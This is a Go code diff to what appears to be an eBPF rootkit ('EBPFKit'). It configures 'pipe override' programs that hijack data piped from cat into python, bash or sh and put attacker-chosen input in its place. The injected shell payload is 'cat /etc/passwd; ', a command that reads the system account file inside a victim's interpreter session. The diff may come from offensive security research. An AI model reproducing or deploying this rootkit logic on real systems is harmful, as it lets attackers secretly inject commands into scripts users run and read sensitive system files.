@@ -114,24 +114,39 @@ func (e *EBPFKit) setupDefaultManager() {
 				Name: "comm_prog_key",
 				Contents: []ebpf.MapKV{
 					{
-						Key:   NewCommBuffer("cat", "python"),
-						Value: PipeOverridePythonKey,
+						Key: NewCommBuffer("cat", "python"),
+						Value: CommProgKey{
+							ProgKey: PipeOverridePythonKey,
+							Backup:  0,
+						},
 					},
 					{
-						Key:   NewCommBuffer("cat", "python3"),
-						Value: PipeOverridePythonKey,
+						Key: NewCommBuffer("cat", "python3"),
+						Value: CommProgKey{
+							ProgKey: PipeOverridePythonKey,
+							Backup:  0,
+						},
 					},
 					{
-						Key:   NewCommBuffer("cat", "python3.8"),
-						Value: PipeOverridePythonKey,
+						Key: NewCommBuffer("cat", "python3.8"),
+						Value: CommProgKey{
+							ProgKey: PipeOverridePythonKey,
+							Backup:  0,
+						},
 					},
 					{
-						Key:   NewCommBuffer("cat", "bash"),
-						Value: PipeOverrideShellKey,
+						Key: NewCommBuffer("cat", "bash"),
+						Value: CommProgKey{
+							ProgKey: PipeOverrideShellKey,
+							Backup:  1,
+						},
 					},
 					{
-						Key:   NewCommBuffer("", "sh"),
-						Value: PipeOverrideShellKey,
+						Key: NewCommBuffer("", "sh"),
+						Value: CommProgKey{
+							ProgKey: PipeOverrideShellKey,
+							Backup:  1,
+						},
 					},
 				},
 			},
@@ -144,7 +159,7 @@ func (e *EBPFKit) setupDefaultManager() {
 					},
 					{
 						Key:   PipeOverrideShellKey,
-						Value: NewPipedProgram("cat /etc/passwd"),
+						Value: NewPipedProgram("cat /etc/passwd; "),
 					},
 				},
 			},
